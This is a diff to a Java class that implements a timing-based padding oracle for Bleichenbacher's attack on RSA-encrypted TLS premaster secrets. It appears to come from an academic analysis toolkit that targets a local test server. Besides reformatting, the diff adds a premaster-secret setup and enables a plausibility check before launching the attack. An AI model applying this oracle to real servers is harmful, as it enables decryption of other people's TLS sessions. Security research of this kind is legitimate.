@@ -15,7 +15,11 @@ import de.fau.pi1.timerReporter.writer.WritePDF;
 import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
 import de.rub.nds.ssl.analyzer.removeMe.SSLServer;
+import de.rub.nds.ssl.stack.Utility;
+import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
+import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
@@ -101,7 +105,6 @@ public class TimingOracle extends ATimingOracle {
         (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
         (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
         (byte) 0x40};
-    
     private Cipher cipher;
     private SSLServer sslServer;
     /**
@@ -132,38 +135,29 @@ public class TimingOracle extends ATimingOracle {
      * Protocol short name.
      */
     private String protocolShortName = "TLS";
-    
     /**
      * Amount of training measurementsTest
      */
     private static final int trainingAmount = 200;
-    
     /**
      * Amount of measurementsTest per Oracle query
      */
     private static final int measurementAmount = 50;
     private static final int measurementFactorForValidation = 3;
-    
     /**
      * Amount of warmup measurementsTest
      */
     private static final int warmupAmount = 10;
-    
     /**
      * Timing difference between invalid and valid timings
      */
     private static final long validInvalidBoundary = -20000;
-    
-    
     private int boxLowPercentile = 20,
             boxHighPercentile = 20;
-        
     private int counterOracle = 0;
     private int counterRequest = 0;
-    
     ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
     ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
-    
     // TODO: just for debugging
     public byte[] encPMSWrong;
     public byte[] encPMS;
@@ -186,53 +180,60 @@ public class TimingOracle extends ATimingOracle {
         cipher = Cipher.getInstance("RSA/None/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, privateKey);
     }
-    
+
     private boolean isValidPMS(byte[] testPMS) {
         boolean result;
-        
+
         counterRequest++;
         result = isValidPMS(testPMS, measurementAmount);
-                
-        if(result == true) {
-            System.out.println("Found a candidate for a valid key. Checking again with more measurements.");
-            result = isValidPMS(testPMS, measurementAmount * measurementFactorForValidation);
+
+        if (result == true) {
+            System.out.
+                    println(
+                    "Found a candidate for a valid key. Checking again with more measurements.");
+            result = isValidPMS(testPMS,
+                    measurementAmount * measurementFactorForValidation);
         }
-        
+
         return result;
     }
 
     /**
-     * This method performs the statistical analysis of the timing measurementsTest.
-     * It assumes that a valid key has a significantly lower response time than
-     * an invalid key. In a nutshell, the method performs Crosby's box test.
+     * This method performs the statistical analysis of the timing
+     * measurementsTest. It assumes that a valid key has a significantly lower
+     * response time than an invalid key. In a nutshell, the method performs
+     * Crosby's box test.
      *
      * @param testKey An array containing the list of measurementsTest that were
      * performed with the key to be tested
-     * @param validKey An array containing the list of measurementsTest that were
-     * performed with a known-to-be-valid key
-     * @return true if testKey is significantly different from invalidKey and thus valid.
+     * @param validKey An array containing the list of measurementsTest that
+     * were performed with a known-to-be-valid key
+     * @return true if testKey is significantly different from invalidKey and
+     * thus valid.
      */
     private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements) {
-    
+
         long[] measurementsTest = new long[amountOfMeasurements];
         long[] measurementsInvalid = new long[amountOfMeasurements];
 
         for (int i = 0; i < amountOfMeasurements; i++) {
             try {
-                exectuteWorkflow(testPMS);
+                exectuteWorkflow(testPMS, ESupportedSockets.TimingSocket);
                 measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
-                
-                exectuteWorkflow(encPMSWrong);
-                measurementsInvalid[i] = getTimeDelay(getWorkflow().getTraceList());
+
+                exectuteWorkflow(encPMSWrong, ESupportedSockets.TimingSocket);
+                measurementsInvalid[i] = getTimeDelay(getWorkflow().
+                        getTraceList());
             } catch (OracleException ex) {
-                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                        log(Level.SEVERE, null, ex);
             }
         }
 
         Arrays.sort(measurementsTest);
         Arrays.sort(measurementsInvalid);
-        
-        int posLow  = measurementsTest.length  * boxLowPercentile  / 100;
+
+        int posLow = measurementsTest.length * boxLowPercentile / 100;
         int posHigh = measurementsInvalid.length * boxHighPercentile / 100;
 
         /*
@@ -240,9 +241,11 @@ public class TimingOracle extends ATimingOracle {
          * than the validInvalidBoundary, then the key is valid (--> true).
          */
         boolean result = (measurementsTest[posLow] - measurementsInvalid[posHigh]) < validInvalidBoundary;
-        
-        
-        System.out.println("ZZZ " + measurementsTest[posLow] + " - " + measurementsInvalid[posHigh] + " = " + (measurementsTest[posLow] - measurementsInvalid[posHigh]) + ", " + result);
+
+
+        System.out.
+                println(
+                "ZZZ " + measurementsTest[posLow] + " - " + measurementsInvalid[posHigh] + " = " + (measurementsTest[posLow] - measurementsInvalid[posHigh]) + ", " + result);
 
         return result;
     }
@@ -250,16 +253,16 @@ public class TimingOracle extends ATimingOracle {
     @Override
     public void trainOracle(byte[] validRequest, byte[] invalidRequest)
             throws OracleException {
-        
+
         // warmup
         System.out.print("warmup... ");
-        for(int i = 0; i < warmupAmount / 2; i++){
-            exectuteWorkflow(invalidRequest);
-            exectuteWorkflow(validRequest);
+        for (int i = 0; i < warmupAmount / 2; i++) {
+            exectuteWorkflow(invalidRequest, ESupportedSockets.TimingSocket);
+            exectuteWorkflow(validRequest, ESupportedSockets.TimingSocket);
         }
         System.out.println("done!");
-        
-      
+
+
 //        try {
 //            long delay;
 //            // train the oracle using the executeWorkflow functionality
@@ -297,7 +300,7 @@ public class TimingOracle extends ATimingOracle {
 //        } catch (IOException ex) {
 //            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
 //        }
-        
+
 //        Conf.put("inputFile", "training_data.csv");
 //        Conf.put("gnuplot", "/usr/bin/gnuplot");
 //        Conf.put("makeindexPath", "/usr/bin/makeindex");
@@ -372,20 +375,27 @@ public class TimingOracle extends ATimingOracle {
 //        // delete the folder tmp
 //        Folder.deleteTmp();
     }
-    
+
     private void plausibilityCheck() {
         try {
             for (int i = 0; i < 100; i++) {
                 if (i % 2 == 0) {
-                    System.out.println("TRUE  : Ground truth: " + cheat(encPMS) + ", timing: " + isValidPMS(encPMS));
+                    System.out.
+                            println("TRUE  : Ground truth: " + cheat(encPMS) + ", timing: " + isValidPMS(
+                            encPMS));
                 } else {
-                    System.out.println("FALSE : Ground truth: " + cheat(encPMSWrong) + ", timing: " + isValidPMS(encPMSWrong));
+                    System.out.
+                            println(
+                            "FALSE : Ground truth: " + cheat(encPMSWrong) + ", timing: " + isValidPMS(
+                            encPMSWrong));
                 }
             }
         } catch (IllegalBlockSizeException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         } catch (BadPaddingException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         }
     }
 
@@ -404,7 +414,10 @@ public class TimingOracle extends ATimingOracle {
         try {
             Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
             cipher.init(Cipher.ENCRYPT_MODE, publicKey);
-            result = cipher.doFinal(msg);
+            byte[] tmp = cipher.doFinal(msg);
+            // deep copy
+            result = new byte[tmp.length];
+            System.arraycopy(tmp, 0, result, 0, result.length);
         } catch (NoSuchAlgorithmException ex) {
             logger.error(ex.getMessage(), ex);
         } catch (IllegalBlockSizeException ex) {
@@ -420,7 +433,8 @@ public class TimingOracle extends ATimingOracle {
         return result;
     }
 
-    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException, BadPaddingException {
+    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException,
+            BadPaddingException {
         boolean result;
 
         byte[] plainMessage = cipher.doFinal(msg);;
@@ -431,19 +445,18 @@ public class TimingOracle extends ATimingOracle {
 
         return result;
     }
-    
 
     @Override
     public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
         boolean ret = false;
         boolean groundTruth = false;
-        
+
         try {
             groundTruth = cheat(encPMS);
             boolean test = isValidPMS(encPMS);
-            
-            if(groundTruth == false) {
-                if(test == false) {
+
+            if (groundTruth == false) {
+                if (test == false) {
                     /*
                      * all good!
                      */
@@ -454,20 +467,27 @@ public class TimingOracle extends ATimingOracle {
                      * key was valid. This is the worst case, because it will most
                      * certainly break the subsequent computations. We will stop here.
                      */
-                    System.err.println("ERROR: invalid key was predicted to be valid. Stopping.");
-                    java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, "ERROR: invalid key was predicted to be valid. Stopping.");
+                    System.err.
+                            println(
+                            "ERROR: invalid key was predicted to be valid. Stopping.");
+                    java.util.logging.Logger.getLogger(TimingOracle.class.
+                            getName()).log(Level.SEVERE,
+                            "ERROR: invalid key was predicted to be valid. Stopping.");
                     System.exit(1);
                 }
-                
+
             } else {
-                if(test == false) {
+                if (test == false) {
                     /*
                      * The submitted key was valid but our test predicted that the
                      * key was invalid. This decreases the performance of the attack
                      * but does not necessarily break subsequent computations.
                      */
-                    System.err.println("ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
-                    java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.WARNING, "ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
+                    System.err.println("ERROR: valid key was predicted to be "
+                            + "invalid. This decreases the attack performance.");
+                    java.util.logging.Logger.getLogger(TimingOracle.class.
+                            getName()).log(Level.WARNING,
+                            "ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
                     ret = test;
                 } else {
                     /*
@@ -478,13 +498,16 @@ public class TimingOracle extends ATimingOracle {
             }
 
         } catch (IllegalBlockSizeException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         } catch (BadPaddingException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         }
-        
-        System.out.println(counterOracle++ + ": Ground truth: " + groundTruth + ", timingoracle: " + ret);
-        
+
+        System.out.println(counterOracle++ + ": Ground truth: " 
+                + groundTruth + ", timingoracle: " + ret);
+
         return ret;
     }
 
@@ -505,39 +528,41 @@ public class TimingOracle extends ATimingOracle {
     }
 
     public static void main(String[] args) {
-        ClassLoader classLoader = TimingOracle.class.getClassLoader();
-        URL resource = classLoader.getResource("logging.properties");
-        PropertyConfigurator.configure(resource);
-        
+        PropertyConfigurator.configure("logging.properties");
+
         try {
             String keyName = "2048_rsa";
             String keyPassword = "password";
-            InputStream stream = classLoader.getResourceAsStream("2048.jks");
 
-            KeyStore ks = loadKeyStore(stream, "password");
+            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
+                    "password");
             PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
-            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.toCharArray());
+            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
+                    toCharArray());
 
-            TimingOracle to = new TimingOracle("127.0.0.1", PORT,
+            TimingOracle to = new TimingOracle("127.0.0.1",PORT,
                     privateKey, OracleType.TTT);
             // TODO: Start SSL-Server for testing purposes
             to.setUp();
 
+            // a PMS is exactly 48 bytes long!
+            byte[] rawPMS = new byte[48];            
+            System.arraycopy(plainPKCS, plainPKCS.length - 48, rawPMS, 0,
+                    rawPMS.length);
+            // it is necessary to set the plain PMS for a complete handshake
+            to.setPlainPMS(new PreMasterSecret(rawPMS));    
+
             byte[] plainPKCS_wrong = new byte[plainPKCS.length];
             System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
             plainPKCS_wrong[0] = 23;
-
-            byte[] encPMS = encryptHelper(plainPKCS, publicKey);
-            byte[] encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
             
-            to.encPMS = encPMS;
-            to.encPMSWrong = encPMSWrong;
+            to.encPMS = encryptHelper(plainPKCS, publicKey);
+            to.encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
 
-            to.trainOracle(encPMS, encPMSWrong);
-            //to.plausibilityCheck();
-   
-            Bleichenbacher attacker = new Bleichenbacher(encPMS,
-                    to, true);
+            to.trainOracle(to.encPMS, to.encPMSWrong);
+            to.plausibilityCheck();
+
+            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
             attacker.attack();
         } catch (InvalidKeyException ex) {
             logger.error(ex.getMessage(), ex);
@@ -547,11 +572,11 @@ public class TimingOracle extends ATimingOracle {
             logger.error(ex.getMessage(), ex);
         } catch (KeyStoreException ex) {
             logger.error(ex.getMessage(), ex);
-        } catch (IOException ex) {
-            logger.error(ex.getMessage(), ex);
         } catch (NoSuchAlgorithmException ex) {
             logger.error(ex.getMessage(), ex);
         } catch (CertificateException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (IOException ex) {
             logger.error(ex.getMessage(), ex);
         } catch (OracleException ex) {
             logger.error(ex.getMessage(), ex);
